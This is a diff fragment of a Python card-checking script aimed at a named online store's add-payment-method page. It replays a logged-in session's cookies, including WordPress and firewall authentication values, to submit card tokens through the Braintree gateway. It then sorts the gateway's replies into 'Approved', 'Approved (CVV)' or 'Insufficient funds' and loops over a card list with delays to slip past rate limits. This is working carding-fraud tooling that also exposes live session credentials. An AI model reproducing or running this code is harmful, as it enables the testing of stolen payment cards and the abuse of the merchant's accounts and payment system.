+    '_fbp': 'fb.1.1736006412732.420953378166065922',
+    'brandcdn_uid': 'b71759a9-61bd-4165-bbc1-6ef60c1677dc',
+    'tk_ai': 'RSBa26eUmiKTIeEGbHZJLOv%2F',
+    '_clck': '13x9fzg%7C2%7Cfsb%7C0%7C1830',
+    'wp_automatewoo_session_started': '1',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2025-01-05%2017%3A33%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2025-01-05%2017%3A33%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
+    '__utmzzses': '1',
+    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'moerneb%7C1737308011%7CaegbjxeEsmHuvJ73l7sc9onP3LEuakMRQrgYzw7Haqi%7Cfbc0f77c1c7ee757297c8f98917cb3fe49cc77f8b687bd0c47398928dd5f12c0',
+    'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': 'yoozpqdgz68vx3ioh6ti',
+    'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '16317%7Cother%7Cread%7Cb9e66c07897ba16f9bca53b4c8b6ae9d3fa7508d841064088dcdbb15781b352a',
+    '_gat_UA-2829389-2': '1',
+    '_gat_UA-2829389-1': '1',
+    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F',
+    'tk_qs': '',
+    '_ga': 'GA1.2.769032502.1736006412',
+    '_uetsid': 'f9f9eae0cab411efbf27c56dd14dde31',
+    '_uetvid': 'f9faa940cab411efa888330e4bf06587',
+    '_clsk': '9zmptl%7C1736098494539%7C8%7C1%7Cx.clarity.ms%2Fcollect',
+    '_ga_JT1Y3HZ65M': 'GS1.1.1736098393.5.1.1736098501.0.0.0',
+}
+
+	headers = {
+    'authority': 'www.yazoomills.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': '_gcl_au=1.1.416404024.1736006411; __utmzz=utmcsr=(direct)|utmcmd=(none)|utmccn=(not set); _gid=GA1.2.392367569.1736006412; _fbp=fb.1.1736006412732.420953378166065922; brandcdn_uid=b71759a9-61bd-4165-bbc1-6ef60c1677dc; tk_ai=RSBa26eUmiKTIeEGbHZJLOv%2F; _clck=13x9fzg%7C2%7Cfsb%7C0%7C1830; wp_automatewoo_session_started=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-05%2017%3A33%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-01-05%2017%3A33%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; __utmzzses=1; wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee=moerneb%7C1737308011%7CaegbjxeEsmHuvJ73l7sc9onP3LEuakMRQrgYzw7Haqi%7Cfbc0f77c1c7ee757297c8f98917cb3fe49cc77f8b687bd0c47398928dd5f12c0; wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee=yoozpqdgz68vx3ioh6ti; wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103=16317%7Cother%7Cread%7Cb9e66c07897ba16f9bca53b4c8b6ae9d3fa7508d841064088dcdbb15781b352a; _gat_UA-2829389-2=1; _gat_UA-2829389-1=1; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F; tk_qs=; _ga=GA1.2.769032502.1736006412; _uetsid=f9f9eae0cab411efbf27c56dd14dde31; _uetvid=f9faa940cab411efa888330e4bf06587; _clsk=9zmptl%7C1736098494539%7C8%7C1%7Cx.clarity.ms%2Fcollect; _ga_JT1Y3HZ65M=GS1.1.1736098393.5.1.1736098501.0.0.0',
+    'origin': 'https://www.yazoomills.com',
+    'referer': 'https://www.yazoomills.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+}
+
+	data = {
+    'payment_method': 'braintree_credit_card',
+    'wc-braintree-credit-card-card-type': 'master-card',
+    'wc-braintree-credit-card-3d-secure-enabled': '',
+    'wc-braintree-credit-card-3d-secure-verified': '',
+    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+    'wc_braintree_credit_card_payment_nonce':tokens,
+    'wc_braintree_device_data': '{"correlation_id":"e23593b0494ad4d789a958bc30378039"}',
+    'wc-braintree-credit-card-tokenize-payment-method': 'true',
+    'woocommerce-add-payment-method-nonce': '1317e12648',
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'woocommerce_add_payment_method': '1',
+}
+
+	response = requests.post('https://www.yazoomills.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
+	text = response.text
+	import re
+	pattern = r'<ul class="woocommerce-error" role="alert">\s*<li>\s*Status code\s*([^<]+)\s*</li>'
+	match = re.search(pattern, text)
+	if match:
+		kopi = match.group(1)
+		if 'risk_threshold' in kopi:
+			return "RISK: Retry this BIN later."
+		elif 'You cannot add a new payment method so soon after the previous one' in kopi:
+			return "Please wait for 20 seconds."
+		elif 'Nice! New payment method added' in kopi or 'Payment method successfully added.' in kopi:
+			return '1000: Approved'
+		elif 'Duplicate card exists in the vault.' in kopi:
+			return 'Approved'
+		elif "avs: Gateway Rejected: avs" in kopi or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in kopi or "cvv: Gateway Rejected: cvv" in kopi:
+			return 'Insufficient funds'
+		elif "Invalid postal code" in kopi or "CVV." in kopi:
+			return 'Approved (CVV)'
+		elif "Card Issuer Declined CVV" in kopi:
+			return 'Approved (CCN)'
+		else:
+			return kopi
+	else:
+		if 'Payment method successfully added.' in text:
+			return "1000: Approved"
+		elif 'risk_threshold' in text:
+			return "RISK: Retry this BIN later."
+		elif 'Please wait for 20 seconds.' in text:
+			time.sleep(21)
+		else:
+			return 'Unknow Response'
+	
+for card in lino:
+    msg = str(cc(card)).strip()
+    if 'Approved' in msg or 'Insufficient funds' in msg:
+    	print(Fore.GREEN+f"{card} >> {msg} Douple ✅")
+    	
     else:
-        print(f'{P} >> DeclineD ❌ ')
-    time.sleep(25)
-
+    	print(Fore.RED+f"{card} >> "+msg+'❌')
+    time.sleep(15)
